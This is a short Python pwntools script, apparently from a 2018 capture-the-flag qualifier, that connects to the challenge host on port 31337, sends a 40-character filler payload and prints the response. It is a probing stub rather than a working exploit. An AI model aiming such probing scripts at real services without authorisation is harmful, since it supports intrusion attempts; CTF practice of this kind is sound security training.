from pwn import *


c = connect('e4771e24.quals2018.oooverflow.io', 31337)
payload = "1111111111111111111111111111111111111111"
c.send(payload)
data = c.recv(4096)
print data
